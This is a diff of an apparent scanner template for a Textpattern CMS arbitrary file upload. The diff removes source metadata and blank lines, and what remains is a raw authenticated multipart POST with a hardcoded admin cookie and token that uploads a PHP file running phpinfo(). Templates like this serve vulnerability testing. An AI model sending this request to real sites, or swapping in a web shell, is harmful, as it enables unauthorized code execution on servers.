@@ -3,12 +3,8 @@ info:
   name: textpanttern cms任意文件上传
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/dqr1a9f9hew1iwaw'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: dqr1a9f9hew1iwaw
-    fofa: app="Textpattern-CMS"
 http:
 - raw:
   - 'POST /textpattern/textpattern/index.php?event=file HTTP/1.1
@@ -35,14 +31,10 @@ http:
     Cookie: txp_login=admin%2C8303b159c13c22402a789348e7dbd46d; txp_login_public=cfeff738edadmin
 
 
-
-
     -----------------------------50124112016268391132465212078
 
 
     Content-Disposition: form-data; name="fileInputOrder"
-
-
 
 
     1/1
@@ -54,8 +46,6 @@ http:
     Content-Disposition: form-data; name="app_mode"
 
 
-
-
     async
 
 
@@ -63,8 +53,6 @@ http:
 
 
     Content-Disposition: form-data; name="MAX_FILE_SIZE"
-
-
 
 
     2000000
@@ -76,8 +64,6 @@ http:
     Content-Disposition: form-data; name="event"
 
 
-
-
     file
 
 
@@ -85,8 +71,6 @@ http:
 
 
     Content-Disposition: form-data; name="step"
-
-
 
 
     file_insert
@@ -98,16 +82,10 @@ http:
     Content-Disposition: form-data; name="id"
 
 
-
-
-
-
     -----------------------------50124112016268391132465212078
 
 
     Content-Disposition: form-data; name="_txp_token"
-
-
 
 
     3026382e9eefd2d3593ad25522d295d4
@@ -122,11 +100,7 @@ http:
     Content-Type: application/octet-stream
 
 
-
-
     <?php phpinfo();?>
-
-
 
 
     -----------------------------50124112016268391132465212078--
